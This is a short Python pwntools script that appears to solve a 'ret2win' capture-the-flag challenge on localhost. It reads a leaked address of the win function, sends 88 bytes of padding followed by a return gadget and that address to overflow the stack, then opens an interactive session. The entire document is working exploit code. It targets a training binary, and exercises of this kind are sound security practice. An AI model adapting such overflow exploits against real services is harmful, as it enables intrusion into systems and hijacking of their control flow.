from pwn import *

r = remote('localhost', 5000)

r.recvuntil(b'ret2win challenge. ')

leak_win = int(r.readline().strip(), 16)
ret = leak_win + 21
print('leak:', hex(leak_win))

r.sendline(b'A'*88 + p64(ret) + p64(leak_win))

r.interactive()
